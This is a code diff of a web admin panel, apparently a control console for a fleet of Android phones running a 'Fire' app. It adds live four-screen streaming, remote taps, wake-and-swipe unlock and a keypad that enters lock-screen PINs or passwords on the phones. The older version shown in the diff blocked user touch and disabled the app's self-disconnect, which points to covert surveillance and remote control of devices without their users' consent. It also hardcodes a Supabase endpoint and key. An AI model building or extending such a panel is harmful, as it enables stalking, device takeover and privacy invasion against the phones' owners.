@@ -3,341 +3,182 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Fire Live Screen Monitor - Admin Panel</title>
+  <title>Fire 4-Grid Live Monitor & Remote Unlock Admin</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
   <style>
     body {
-      background-color: #060b19;
+      background-color: #050914;
       color: #e2e8f0;
       font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
     }
     .panel-card {
-      background: linear-gradient(145deg, #0c1428 0%, #091020 100%);
+      background: linear-gradient(145deg, #0b1326 0%, #080e1c 100%);
       border: 1px solid #1e293b;
-      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.55);
     }
-    .glow-green { box-shadow: 0 0 15px rgba(16, 185, 129, 0.35); }
-    .glow-red { box-shadow: 0 0 15px rgba(239, 68, 68, 0.35); }
+    .selected-slot {
+      border-color: #38bdf8 !important;
+      box-shadow: 0 0 20px rgba(56, 189, 248, 0.3);
+    }
     ::-webkit-scrollbar { width: 5px; height: 5px; }
     ::-webkit-scrollbar-track { background: #0f172a; }
     ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
   </style>
 </head>
-<body class="min-h-screen flex overflow-x-hidden">
+<body class="min-h-screen flex flex-col lg:flex-row overflow-x-hidden">
 
-  <!-- Left Vertical Navigation Sidebar -->
-  <aside class="w-16 bg-[#080e1e] border-r border-slate-800/80 flex flex-col items-center py-4 justify-between shrink-0">
-    <div class="flex flex-col items-center gap-6">
-      <div class="w-10 h-10 rounded-xl bg-orange-500/10 border border-orange-500/30 flex items-center justify-center text-orange-400 text-xl">
-        <i class="fa-solid fa-fire"></i>
+  <!-- LEFT SIDEBAR: Online Devices Lobby (100+ Ready) -->
+  <aside class="w-full lg:w-72 bg-[#080e1e] border-b lg:border-b-0 lg:border-r border-slate-800 p-4 flex flex-col gap-3 shrink-0">
+    <div class="flex items-center justify-between">
+      <div class="flex items-center gap-2.5">
+        <div class="w-9 h-9 rounded-xl bg-orange-500/15 border border-orange-500/40 flex items-center justify-center text-orange-400">
+          <i class="fa-solid fa-fire"></i>
+        </div>
+        <div>
+          <h1 class="text-sm font-bold text-white tracking-wide">FIRE FLEET ADMIN</h1>
+          <p class="text-[11px] text-slate-400">4-Screen Grid & Remote Touch</p>
+        </div>
       </div>
-      <nav class="flex flex-col gap-4 text-slate-400">
-        <button title="Dashboard" class="w-10 h-10 rounded-lg bg-blue-600/20 text-blue-400 border border-blue-500/40 flex items-center justify-center">
-          <i class="fa-solid fa-table-cells-large"></i>
-        </button>
-        <button title="Devices" class="w-10 h-10 rounded-lg hover:bg-slate-800 flex items-center justify-center transition">
-          <i class="fa-solid fa-mobile-screen"></i>
-        </button>
-        <button title="Users" class="w-10 h-10 rounded-lg hover:bg-slate-800 flex items-center justify-center transition">
-          <i class="fa-solid fa-users"></i>
-        </button>
-        <button title="Recordings" class="w-10 h-10 rounded-lg hover:bg-slate-800 flex items-center justify-center transition">
-          <i class="fa-solid fa-video"></i>
-        </button>
-        <button title="Settings" class="w-10 h-10 rounded-lg hover:bg-slate-800 flex items-center justify-center transition">
-          <i class="fa-solid fa-gear"></i>
-        </button>
-      </nav>
+      <span id="onlineCountBadge" class="text-xs font-bold px-2.5 py-1 rounded-full bg-emerald-500/15 text-emerald-400 border border-emerald-500/30">
+        0 Online
+      </span>
     </div>
-    <div class="flex flex-col gap-4 text-slate-500">
-      <button title="Help" class="w-9 h-9 rounded-full border border-slate-700 hover:text-white flex items-center justify-center">
-        <i class="fa-solid fa-question text-xs"></i>
+
+    <!-- Search Devices -->
+    <div class="relative">
+      <i class="fa-solid fa-magnifying-glass absolute left-3 top-2.5 text-slate-500 text-xs"></i>
+      <input id="deviceSearch" oninput="renderDeviceList()" type="text" placeholder="Search device ID or model..."
+        class="w-full bg-[#050914] border border-slate-700 rounded-lg pl-8 pr-3 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-cyan-500" />
+    </div>
+
+    <!-- Pagination Controls for 4-Grid -->
+    <div class="bg-[#050914] border border-slate-800 rounded-xl p-2.5 flex items-center justify-between">
+      <button onclick="changePage(-1)" class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-xs font-semibold">
+        <i class="fa-solid fa-chevron-left"></i> Prev 4
       </button>
+      <span id="pageIndicator" class="text-xs font-mono text-cyan-400">Page 1 (1–4)</span>
+      <button onclick="changePage(1)" class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-xs font-semibold">
+        Next 4 <i class="fa-solid fa-chevron-right"></i>
+      </button>
+    </div>
+
+    <div class="flex gap-2">
+      <button onclick="connectCurrentPage4()"
+        class="flex-1 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold py-2 rounded-lg transition">
+        <i class="fa-solid fa-play mr-1"></i> Stream Page 4
+      </button>
+      <button onclick="disconnectAllSlots()"
+        class="flex-1 bg-red-600/80 hover:bg-red-500 text-white text-xs font-bold py-2 rounded-lg transition">
+        <i class="fa-solid fa-stop mr-1"></i> Stop All 4
+      </button>
+    </div>
+
+    <!-- Online Devices List -->
+    <div class="text-[11px] font-semibold text-slate-400 uppercase tracking-wider mt-1">Connected Devices</div>
+    <div id="deviceListContainer" class="flex-1 overflow-y-auto max-h-60 lg:max-h-[calc(100vh-280px)] space-y-2 pr-1">
+      <div class="text-xs text-slate-500 text-center py-6">Listening on Fire Lobby...</div>
     </div>
   </aside>
 
-  <!-- Main Workspace -->
-  <main class="flex-1 p-4 flex flex-col gap-4 max-w-[1600px] mx-auto">
-
-    <!-- Top Header & Admin Handshake Controls -->
-    <header class="panel-card rounded-2xl p-4">
-      <div class="flex flex-wrap items-center justify-between gap-3 mb-4">
-        <div class="flex items-center gap-3">
-          <h1 class="text-lg md:text-xl font-bold tracking-wide text-cyan-400">
-            FIRE LIVE SCREEN MONITOR
-          </h1>
-          <span id="connBadge" class="text-xs px-3 py-1 rounded-full bg-amber-500/20 border border-amber-500/40 text-amber-300 font-medium">
-            Initializing Channel...
-          </span>
-        </div>
-
-        <div class="flex items-center gap-3">
-          <span id="deviceOnlineTag" class="text-xs px-3 py-1 rounded-full bg-slate-800 border border-slate-700 text-slate-400">
-            Device Status: Checking...
-          </span>
-          <div id="liveIndicator" class="hidden items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/40 text-emerald-400 text-xs font-bold">
-            <span class="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-ping"></span>
-            ((• LIVE •))
-          </div>
-        </div>
-      </div>
-
-      <!-- Pre-Configured Inputs & Admin Master Connect/Disconnect Buttons -->
-      <div class="grid grid-cols-1 md:grid-cols-12 gap-3 items-end">
-        <div class="md:col-span-3">
-          <label class="block text-[11px] text-slate-400 mb-1">Supabase Project URL (Pre-configured)</label>
-          <input id="sbUrl" type="text" value="https://pigsylxeeoztnyuydqtr.supabase.co"
-            class="w-full bg-[#060b19] border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500" />
-        </div>
-
-        <div class="md:col-span-3">
-          <label class="block text-[11px] text-slate-400 mb-1">Supabase Publishable Key (Pre-configured)</label>
-          <input id="sbKey" type="password" value="sb_publishable_JrDxSeFli4NkkVhopnwCoQ_aa7HFsgl"
-            class="w-full bg-[#060b19] border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500" />
-        </div>
-
-        <div class="md:col-span-2">
-          <label class="block text-[11px] text-slate-400 mb-1">Device / Room ID</label>
-          <input id="roomId" type="text" value="device_1"
-            class="w-full bg-[#060b19] border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500" />
-        </div>
-
-        <!-- Admin Handshake Master Control Buttons -->
-        <div class="md:col-span-4 flex flex-col">
-          <span class="text-[11px] text-emerald-400 font-semibold mb-1 text-center">Admin Handshake Control</span>
-          <div class="grid grid-cols-2 gap-2">
-            <button onclick="adminConnectDevice()" id="btnConnect"
-              class="bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs py-2.5 px-3 rounded-lg transition glow-green flex items-center justify-center gap-1.5">
-              <i class="fa-solid fa-plug"></i> CONNECT DEVICE
-            </button>
-            <button onclick="adminDisconnectDevice()" id="btnDisconnect"
-              class="bg-red-600/90 hover:bg-red-500 text-white font-bold text-xs py-2.5 px-3 rounded-lg transition glow-red flex items-center justify-center gap-1.5">
-              <i class="fa-solid fa-power-off"></i> DISCONNECT DEVICE
-            </button>
-          </div>
-        </div>
-      </div>
-    </header>
-
-    <!-- Main 3-Column Dashboard Grid -->
-    <div class="grid grid-cols-1 lg:grid-cols-12 gap-4 flex-1">
-
-      <!-- COLUMN 1: Live Mobile Screen Player (4 Cols) -->
-      <section class="lg:col-span-4 panel-card rounded-2xl p-4 flex flex-col justify-between">
-        <div class="flex items-center justify-between text-xs text-slate-400 mb-2">
-          <span>Mobile Screen Stream</span>
-          <span id="streamTimer" class="font-mono text-cyan-400">00:00:00</span>
-        </div>
-
-        <!-- Phone Bezel Frame -->
-        <div class="relative mx-auto bg-black rounded-[2rem] border-[4px] border-slate-700 overflow-hidden shadow-2xl flex items-center justify-center w-full max-w-[270px]"
-             style="aspect-ratio: 9/19;">
-          <video id="remoteVideo" autoplay playsinline muted onclick="handleScreenClick(event)"
-            class="w-full h-full object-contain cursor-crosshair"></video>
-
-          <!-- Overlay Placeholder when offline -->
-          <div id="screenPlaceholder" class="absolute inset-0 bg-[#050811] flex flex-col items-center justify-center p-5 text-center">
-            <div class="w-14 h-14 rounded-full bg-slate-800/80 border border-slate-700 flex items-center justify-center text-cyan-400 text-2xl mb-3">
-              <i class="fa-solid fa-mobile-screen-button"></i>
-            </div>
-            <p class="text-xs font-semibold text-slate-300">Ready for Admin Command</p>
-            <p class="text-[11px] text-slate-500 mt-1">Click <span class="text-emerald-400 font-semibold">CONNECT DEVICE</span> above to wake & start stream.</p>
-          </div>
-
-          <!-- Bottom Mirroring Status Tag -->
-          <div class="absolute bottom-2 inset-x-2 bg-slate-900/90 backdrop-blur border border-slate-700/80 rounded-lg px-2.5 py-1 flex items-center justify-between text-[10px]">
-            <span class="text-emerald-400 font-medium flex items-center gap-1">
-              <i class="fa-solid fa-shield-halved"></i> MIRRORING (Admin Lock)
-            </span>
-            <span id="overlayTime" class="text-slate-400 font-mono">READY</span>
-          </div>
-        </div>
-
-        <!-- Bottom Player Controls -->
-        <div class="mt-4">
-          <div class="grid grid-cols-2 gap-2">
-            <button onclick="toggleFullscreen()"
-              class="bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs py-2 px-3 rounded-lg flex items-center justify-center gap-2 transition">
-              <i class="fa-solid fa-expand text-cyan-400"></i> Fullscreen
-            </button>
-            <button onclick="sendAdminCommand('ADMIN_START_STREAM')"
-              class="bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs py-2 px-3 rounded-lg flex items-center justify-center gap-2 transition">
-              <i class="fa-solid fa-rotate text-emerald-400"></i> Refresh Stream
-            </button>
-          </div>
-        </div>
-      </section>
-
-      <!-- COLUMN 2: Analytics Charts & Diagnostic Control Buttons (5 Cols) -->
-      <section class="lg:col-span-5 flex flex-col gap-4">
-
-        <!-- Charts Card -->
-        <div class="panel-card rounded-2xl p-4">
-          <h2 class="text-xs font-semibold text-slate-300 uppercase tracking-wider mb-3">Diagnostic & Stream Analytics</h2>
-
-          <!-- Bar Chart -->
-          <div class="mb-4">
-            <div class="flex justify-between text-[11px] text-slate-400 mb-1">
-              <span>Frame Packet Rate (fps/s)</span>
-              <span class="text-emerald-400">● Optimal</span>
-            </div>
-            <div class="h-28 bg-[#060b19] rounded-xl p-2 border border-slate-800">
-              <canvas id="barChart"></canvas>
-            </div>
-          </div>
-
-          <!-- Line Chart -->
-          <div>
-            <div class="flex justify-between text-[11px] text-slate-400 mb-1">
-              <span>Network Bitrate Throughput (kbps)</span>
-              <span class="text-purple-400">● WebRTC P2P</span>
-            </div>
-            <div class="h-28 bg-[#060b19] rounded-xl p-2 border border-slate-800">
-              <canvas id="lineChart"></canvas>
-            </div>
-          </div>
-        </div>
-
-        <!-- Admin Remote Control Grid -->
-        <div class="panel-card rounded-2xl p-4 flex-1">
-          <h2 class="text-xs font-semibold text-slate-300 uppercase tracking-wider mb-3">Remote Admin Actions</h2>
-          <div class="grid grid-cols-2 gap-2.5">
-
-            <button onclick="adminDisconnectDevice()"
-              class="bg-red-950/60 hover:bg-red-900/70 border border-red-500/50 text-red-200 text-xs py-2.5 px-3 rounded-xl flex items-center gap-2 transition text-left">
-              <i class="fa-solid fa-circle-xmark text-red-400"></i>
-              <span>Force System Disconnect</span>
-            </button>
-
-            <button onclick="takeScreenshot()"
-              class="bg-blue-950/60 hover:bg-blue-900/70 border border-blue-500/50 text-blue-200 text-xs py-2.5 px-3 rounded-xl flex items-center gap-2 transition text-left">
-              <i class="fa-solid fa-camera text-blue-400"></i>
-              <span>Take Screenshot</span>
-            </button>
-
-            <button onclick="sendAdminCommand('ADMIN_START_STREAM')"
-              class="bg-amber-950/50 hover:bg-amber-900/60 border border-amber-500/50 text-amber-200 text-xs py-2.5 px-3 rounded-xl flex items-center gap-2 transition text-left">
-              <i class="fa-solid fa-arrows-rotate text-amber-400"></i>
-              <span>Remote Reconnect</span>
-            </button>
-
-            <button onclick="sendAdminCommand('PING_DEVICE')"
-              class="bg-slate-800/80 hover:bg-slate-700 border border-slate-600 text-slate-200 text-xs py-2.5 px-3 rounded-xl flex items-center gap-2 transition text-left">
-              <i class="fa-solid fa-satellite-dish text-cyan-400"></i>
-              <span>Ping Client Status</span>
-            </button>
-
-            <button onclick="sendAdminCommand('REINIT_CAPTURE')"
-              class="bg-yellow-950/50 hover:bg-yellow-900/60 border border-yellow-500/50 text-yellow-200 text-xs py-2.5 px-3 rounded-xl flex items-center gap-2 transition text-left">
-              <i class="fa-solid fa-display text-yellow-400"></i>
-              <span>Re-init Screen Capture</span>
-            </button>
-
-            <button onclick="toggleTouchMode()" id="btnTouchSim"
-              class="bg-indigo-950/60 hover:bg-indigo-900/70 border border-indigo-500/50 text-indigo-200 text-xs py-2.5 px-3 rounded-xl flex items-center gap-2 transition text-left">
-              <i class="fa-solid fa-hand-pointer text-indigo-400"></i>
-              <span>Simulate Touch: OFF</span>
-            </button>
-
-            <button onclick="toggleBlockInput()" id="btnBlockInput"
-              class="bg-rose-950/60 hover:bg-rose-900/70 border border-rose-500/50 text-rose-200 text-xs py-2.5 px-3 rounded-xl flex items-center gap-2 transition text-left">
-              <i class="fa-solid fa-lock text-rose-400"></i>
-              <span>Block User Touch</span>
-            </button>
-
-            <button onclick="sendAdminCommand('HEALTH_CHECK')"
-              class="bg-emerald-950/60 hover:bg-emerald-900/70 border border-emerald-500/50 text-emerald-200 text-xs py-2.5 px-3 rounded-xl flex items-center gap-2 transition text-left">
-              <i class="fa-solid fa-heart-pulse text-emerald-400"></i>
-              <span>Check Stream Health</span>
-            </button>
-
-          </div>
-        </div>
-      </section>
-
-      <!-- COLUMN 3: Device Telemetry Sidebar & Accessibility Event Log (3 Cols) -->
-      <section class="lg:col-span-3 flex flex-col gap-4">
-
-        <!-- Rich Sidebar Statistics -->
-        <div class="panel-card rounded-2xl p-4">
-          <h2 class="text-xs font-semibold text-slate-300 uppercase tracking-wider mb-3">Device Statistics</h2>
-          <div class="space-y-3">
-
-            <div class="flex items-center justify-between bg-[#060b19] p-2.5 rounded-xl border border-slate-800">
-              <div>
-                <p class="text-[11px] text-slate-400">Connection Quality</p>
-                <p id="statQuality" class="text-sm font-bold text-emerald-400">98% (Excellent)</p>
-              </div>
-              <i class="fa-solid fa-signal text-emerald-400 text-lg"></i>
-            </div>
-
-            <div class="flex items-center justify-between bg-[#060b19] p-2.5 rounded-xl border border-slate-800">
-              <div>
-                <p class="text-[11px] text-slate-400">Framerate</p>
-                <p id="statFps" class="text-sm font-bold text-cyan-400">15 fps</p>
-              </div>
-              <i class="fa-solid fa-gauge-high text-cyan-400 text-lg"></i>
-            </div>
-
-            <div class="flex items-center justify-between bg-[#060b19] p-2.5 rounded-xl border border-slate-800">
-              <div>
-                <p class="text-[11px] text-slate-400">Bitrate</p>
-                <p id="statBitrate" class="text-sm font-bold text-blue-400">1.2 Mbps</p>
-              </div>
-              <i class="fa-solid fa-wave-square text-blue-400 text-lg"></i>
-            </div>
-
-            <div class="flex items-center justify-between bg-[#060b19] p-2.5 rounded-xl border border-slate-800">
-              <div>
-                <p class="text-[11px] text-slate-400">Device Model</p>
-                <p id="statModel" class="text-sm font-bold text-slate-200">Waiting...</p>
-              </div>
-              <i class="fa-solid fa-mobile text-slate-400 text-lg"></i>
-            </div>
-
-            <div class="flex items-center justify-between bg-[#060b19] p-2.5 rounded-xl border border-slate-800">
-              <div>
-                <p class="text-[11px] text-slate-400">Android OS</p>
-                <p id="statOs" class="text-sm font-bold text-amber-400">Waiting...</p>
-              </div>
-              <i class="fa-brands fa-android text-amber-400 text-lg"></i>
-            </div>
-
-          </div>
-        </div>
-
-        <!-- Accessibility Key Event Log -->
-        <div class="panel-card rounded-2xl p-4 flex-1 flex flex-col">
-          <div class="flex items-center justify-between mb-2">
-            <h2 class="text-xs font-semibold text-slate-300 uppercase tracking-wider">System & Event Log</h2>
-            <button onclick="clearLogs()" class="text-[10px] text-slate-400 hover:text-white">Clear</button>
-          </div>
-          <div id="eventLogBox"
-            class="flex-1 bg-[#050811] border border-slate-800 rounded-xl p-2.5 font-mono text-[11px] text-emerald-400 overflow-y-auto max-h-56 space-y-1">
-            <div class="text-slate-500">[SYSTEM] Pre-configured Supabase loaded.</div>
-            <div class="text-slate-500">[LOCK] Fire app self-disconnect disabled.</div>
-          </div>
-        </div>
-
-      </section>
+  <!-- CENTER: 4-DISPLAY CCTV LIVE GRID (2x2) -->
+  <main class="flex-1 p-4 flex flex-col gap-4">
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 flex-1" id="gridContainer">
+      <!-- 4 Slots generated dynamically -->
     </div>
   </main>
 
-  <script>
-    const DEFAULT_SUPABASE_URL = "https://pigsylxeeoztnyuydqtr.supabase.co";
-    const DEFAULT_SUPABASE_KEY = "sb_publishable_JrDxSeFli4NkkVhopnwCoQ_aa7HFsgl";
-    const DEFAULT_ROOM_ID = "device_1";
+  <!-- RIGHT SIDEBAR: Remote Touch, Swipe & PIN Unlock Controller -->
+  <aside class="w-full lg:w-80 bg-[#080e1e] border-t lg:border-t-0 lg:border-l border-slate-800 p-4 flex flex-col gap-4 shrink-0">
+    <div class="panel-card rounded-xl p-3">
+      <div class="flex items-center justify-between mb-1">
+        <span class="text-[11px] text-slate-400 uppercase font-semibold">Active Control Target</span>
+        <span id="targetAccessBadge" class="text-[10px] px-2 py-0.5 rounded bg-slate-800 text-slate-400">No Device</span>
+      </div>
+      <div id="activeTargetTitle" class="text-sm font-bold text-cyan-400 truncate">Click any screen to control</div>
+      <div id="activeTargetId" class="text-[11px] font-mono text-slate-500">ID: ---</div>
+    </div>
 
-    let supabaseClient = null;
-    let channel = null;
-    let peerConnection = null;
-    let simulateTouchEnabled = false;
-    let blockUserInputEnabled = false;
-    let timerInterval = null;
-    let secondsElapsed = 0;
+    <!-- Touch Mode Toggle -->
+    <div class="panel-card rounded-xl p-3 space-y-2.5">
+      <div class="flex items-center justify-between">
+        <span class="text-xs font-bold text-white"><i class="fa-solid fa-hand-pointer text-cyan-400 mr-1.5"></i>Direct Screen Touch</span>
+        <button id="btnTouchToggle" onclick="toggleRemoteTouch()"
+          class="px-3 py-1 rounded-full text-xs font-bold bg-emerald-600 text-white">
+          ON (Click Video)
+        </button>
+      </div>
+      <p class="text-[11px] text-slate-400">Click anywhere on the selected phone video to tap exact coordinates on that phone.</p>
+    </div>
+
+    <!-- Lock Screen Wake & Swipe Controls -->
+    <div class="panel-card rounded-xl p-3 space-y-2">
+      <div class="text-xs font-bold text-white mb-2"><i class="fa-solid fa-unlock-keyhole text-amber-400 mr-1.5"></i>Wake & Lock Screen Gestures</div>
+      <div class="grid grid-cols-2 gap-2">
+        <button onclick="sendControl('WAKE_SCREEN')"
+          class="bg-amber-600/20 hover:bg-amber-600/40 border border-amber-500/40 text-amber-300 text-xs font-semibold py-2 px-2.5 rounded-lg">
+          <i class="fa-solid fa-sun mr-1"></i> Wake Screen
+        </button>
+        <button onclick="sendControl('SWIPE_UP')"
+          class="bg-cyan-600/20 hover:bg-cyan-600/40 border border-cyan-500/40 text-cyan-300 text-xs font-semibold py-2 px-2.5 rounded-lg">
+          <i class="fa-solid fa-arrow-up mr-1"></i> Swipe Up (Unlock)
+        </button>
+        <button onclick="sendControl('GLOBAL_BACK')"
+          class="bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs py-2 px-2.5 rounded-lg">
+          <i class="fa-solid fa-arrow-left mr-1"></i> Back
+        </button>
+        <button onclick="sendControl('GLOBAL_HOME')"
+          class="bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs py-2 px-2.5 rounded-lg">
+          <i class="fa-solid fa-house mr-1"></i> Home
+        </button>
+      </div>
+    </div>
+
+    <!-- Remote PIN / Password Unlock Keypad -->
+    <div class="panel-card rounded-xl p-3 space-y-2.5">
+      <div class="text-xs font-bold text-white"><i class="fa-solid fa-key text-emerald-400 mr-1.5"></i>PIN / Password Unlock</div>
+      <div class="flex gap-1.5">
+        <input id="pinInput" type="text" placeholder="Enter PIN or Password..."
+          class="flex-1 bg-[#050914] border border-slate-700 rounded-lg px-2.5 py-1.5 text-xs text-white font-mono focus:outline-none focus:border-emerald-500" />
+        <button onclick="sendPinUnlock()"
+          class="bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold px-3 py-1.5 rounded-lg">
+          Unlock
+        </button>
+      </div>
+
+      <!-- Quick Dial Pad for Lock Screen PINs -->
+      <div class="grid grid-cols-3 gap-1.5 pt-1">
+        <button onclick="appendPin('1')" class="bg-slate-800 hover:bg-slate-700 py-2 rounded text-xs font-bold">1</button>
+        <button onclick="appendPin('2')" class="bg-slate-800 hover:bg-slate-700 py-2 rounded text-xs font-bold">2</button>
+        <button onclick="appendPin('3')" class="bg-slate-800 hover:bg-slate-700 py-2 rounded text-xs font-bold">3</button>
+        <button onclick="appendPin('4')" class="bg-slate-800 hover:bg-slate-700 py-2 rounded text-xs font-bold">4</button>
+        <button onclick="appendPin('5')" class="bg-slate-800 hover:bg-slate-700 py-2 rounded text-xs font-bold">5</button>
+        <button onclick="appendPin('6')" class="bg-slate-800 hover:bg-slate-700 py-2 rounded text-xs font-bold">6</button>
+        <button onclick="appendPin('7')" class="bg-slate-800 hover:bg-slate-700 py-2 rounded text-xs font-bold">7</button>
+        <button onclick="appendPin('8')" class="bg-slate-800 hover:bg-slate-700 py-2 rounded text-xs font-bold">8</button>
+        <button onclick="appendPin('9')" class="bg-slate-800 hover:bg-slate-700 py-2 rounded text-xs font-bold">9</button>
+        <button onclick="clearPin()" class="bg-red-900/50 hover:bg-red-800/60 text-red-300 py-2 rounded text-xs font-bold">CLR</button>
+        <button onclick="appendPin('0')" class="bg-slate-800 hover:bg-slate-700 py-2 rounded text-xs font-bold">0</button>
+        <button onclick="sendPinUnlock()" class="bg-emerald-700 hover:bg-emerald-600 text-white py-2 rounded text-xs font-bold">OK</button>
+      </div>
+    </div>
+
+    <!-- Event Log -->
+    <div class="panel-card rounded-xl p-3 flex-1 flex flex-col">
+      <div class="flex justify-between items-center mb-1.5">
+        <span class="text-[11px] font-semibold text-slate-400 uppercase">Control Log</span>
+        <button onclick="document.getElementById('adminLog').innerHTML=''" class="text-[10px] text-slate-500 hover:text-white">Clear</button>
+      </div>
+      <div id="adminLog" class="flex-1 bg-[#050914] border border-slate-800 rounded-lg p-2 font-mono text-[10px] text-emerald-400 overflow-y-auto max-h-40 space-y-1">
+        <div class="text-slate-500">[SYSTEM] Fire 4-Grid Admin Ready.</div>
+      </div>
+    </div>
+  </aside>
+
+  <script>
+    const SB_URL = "https://pigsylxeeoztnyuydqtr.supabase.co";
+    const SB_KEY = "sb_publishable_JrDxSeFli4NkkVhopnwCoQ_aa7HFsgl";
 
     const rtcConfig = {
       iceServers: [
@@ -346,271 +187,415 @@
       ]
     };
 
-    function addLog(msg, color = 'text-emerald-400') {
-      const box = document.getElementById('eventLogBox');
+    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
+    let lobbyChannel = null;
+    let onlineDevices = {}; // deviceId -> { deviceId, model, os, accessibilityEnabled, hasProjection, lastSeen }
+    let currentPage = 0; // 4 devices per page
+    let selectedDeviceId = null;
+    let remoteTouchActive = true;
+
+    // 4 Active Slot Sessions: slotIndex (0..3) -> { deviceId, channel, pc }
+    const slots = [null, null, null, null];
+
+    function logMsg(msg, color = 'text-emerald-400') {
+      const box = document.getElementById('adminLog');
       const time = new Date().toLocaleTimeString('en-GB', { hour12: false });
-      const line = document.createElement('div');
-      line.className = color;
-      line.textContent = `[${time}] ${msg}`;
-      box.appendChild(line);
+      const div = document.createElement('div');
+      div.className = color;
+      div.textContent = `[${time}] ${msg}`;
+      box.appendChild(div);
       box.scrollTop = box.scrollHeight;
     }
 
-    function clearLogs() {
-      document.getElementById('eventLogBox').innerHTML = '';
-    }
+    // Build 4 Grid Cards in UI
+    function buildGridUI() {
+      const container = document.getElementById('gridContainer');
+      container.innerHTML = '';
+      for (let i = 0; i < 4; i++) {
+        container.innerHTML += `
+          <div id="slotCard-${i}" onclick="selectSlot(${i})"
+            class="panel-card rounded-2xl p-3 flex flex-col justify-between border-2 border-slate-800 cursor-pointer transition">
+            <div class="flex items-center justify-between mb-2">
+              <div class="flex items-center gap-2 truncate">
+                <span id="slotDot-${i}" class="w-2.5 h-2.5 rounded-full bg-slate-600"></span>
+                <span id="slotTitle-${i}" class="text-xs font-bold text-slate-300 truncate">Slot ${i + 1}: Empty</span>
+              </div>
+              <div class="flex items-center gap-1.5">
+                <button onclick="event.stopPropagation(); reconnectSlot(${i})" title="Connect/Refresh"
+                  class="px-2 py-1 rounded bg-emerald-600/20 hover:bg-emerald-600/40 text-emerald-400 text-[10px] font-bold">
+                  <i class="fa-solid fa-plug"></i> Connect
+                </button>
+                <button onclick="event.stopPropagation(); disconnectSlot(${i})" title="Disconnect"
+                  class="px-2 py-1 rounded bg-red-600/20 hover:bg-red-600/40 text-red-400 text-[10px] font-bold">
+                  <i class="fa-solid fa-power-off"></i>
+                </button>
+                <button onclick="event.stopPropagation(); takeSlotScreenshot(${i})" title="Screenshot"
+                  class="px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-cyan-400 text-[10px]">
+                  <i class="fa-solid fa-camera"></i>
+                </button>
+              </div>
+            </div>
 
-    function startTimer() {
-      stopTimer();
-      secondsElapsed = 0;
-      timerInterval = setInterval(() => {
-        secondsElapsed++;
-        const hrs = String(Math.floor(secondsElapsed / 3600)).padStart(2, '0');
-        const mins = String(Math.floor((secondsElapsed % 3600) / 60)).padStart(2, '0');
-        const secs = String(secondsElapsed % 60).padStart(2, '0');
-        document.getElementById('streamTimer').textContent = `${hrs}:${mins}:${secs}`;
-      }, 1000);
-    }
+            <div class="relative bg-black rounded-xl overflow-hidden border border-slate-800 flex items-center justify-center mx-auto w-full"
+                 style="height: 330px;">
+              <video id="slotVideo-${i}" autoplay playsinline muted
+                onclick="handleGridVideoClick(event, ${i})"
+                class="w-full h-full object-contain cursor-crosshair"></video>
 
-    function stopTimer() {
-      if (timerInterval) clearInterval(timerInterval);
-      document.getElementById('streamTimer').textContent = '00:00:00';
-    }
+              <div id="slotPlaceholder-${i}" class="absolute inset-0 flex flex-col items-center justify-center text-slate-600 text-center p-4">
+                <i class="fa-solid fa-mobile-screen text-2xl mb-2"></i>
+                <p class="text-xs font-medium">No Stream in Slot ${i + 1}</p>
+                <p class="text-[10px] mt-0.5">Select a device from left list or click "Stream Page 4"</p>
+              </div>
+            </div>
 
-    function setLiveUI(isLive) {
-      const badge = document.getElementById('connBadge');
-      const liveInd = document.getElementById('liveIndicator');
-      const placeholder = document.getElementById('screenPlaceholder');
-
-      if (isLive) {
-        badge.textContent = 'Active / Admin Connected';
-        badge.className = 'text-xs px-3 py-1 rounded-full bg-emerald-500/20 border border-emerald-500/50 text-emerald-300 font-semibold';
-        liveInd.classList.remove('hidden');
-        liveInd.classList.add('flex');
-        placeholder.classList.add('hidden');
-        document.getElementById('overlayTime').textContent = 'LIVE';
-        startTimer();
-      } else {
-        badge.textContent = 'Standby / Disconnected';
-        badge.className = 'text-xs px-3 py-1 rounded-full bg-red-500/20 border border-red-500/40 text-red-300 font-medium';
-        liveInd.classList.add('hidden');
-        liveInd.classList.remove('flex');
-        placeholder.classList.remove('hidden');
-        document.getElementById('overlayTime').textContent = 'PAUSED';
-        stopTimer();
+            <div class="mt-2 flex items-center justify-between text-[10px] text-slate-400">
+              <span id="slotSub-${i}" class="font-mono">ID: ---</span>
+              <span id="slotTouchTag-${i}" class="text-cyan-400">Touch Ready</span>
+            </div>
+          </div>
+        `;
       }
     }
 
-    function initPeerConnection() {
-      if (peerConnection) peerConnection.close();
-      peerConnection = new RTCPeerConnection(rtcConfig);
+    // Lobby Connection (Discovers all 100 phones automatically)
+    function initLobby() {
+      lobbyChannel = supabaseClient.channel('fire-fleet-lobby', {
+        config: { presence: { key: 'admin_console' } }
+      });
 
-      peerConnection.ontrack = (event) => {
-        const video = document.getElementById('remoteVideo');
